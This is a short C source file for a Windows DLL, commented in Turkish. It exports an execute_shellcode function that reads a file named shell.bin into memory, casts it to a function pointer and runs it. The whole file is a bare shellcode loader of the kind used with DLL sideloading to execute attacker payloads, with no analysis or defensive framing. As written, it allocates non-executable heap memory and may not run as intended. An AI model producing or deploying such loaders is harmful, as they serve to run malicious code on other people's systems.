#include <windows.h>
#include <stdio.h>

__declspec(dllexport) void execute_shellcode() {
    // shell.bin dosyasını oku
    FILE *file = fopen("shell.bin", "rb");
    if (!file) {
        return; // Dosya açılamadıysa geri dön
    }

    // Dosya boyutunu al
    fseek(file, 0, SEEK_END);
    size_t shellcode_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    // Bellekte yeterli alan ayır
    unsigned char *shellcode = (unsigned char *)malloc(shellcode_size);
    if (!shellcode) {
        fclose(file);
        return; // Bellek ayırma hatası
    }

    // Shellcode'u dosyadan oku
    fread(shellcode, 1, shellcode_size, file);
    fclose(file);

    // Shellcode'u çalıştır
    void (*func)() = (void (*)())shellcode;
    func();

    // Belleği temizle
    free(shellcode);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
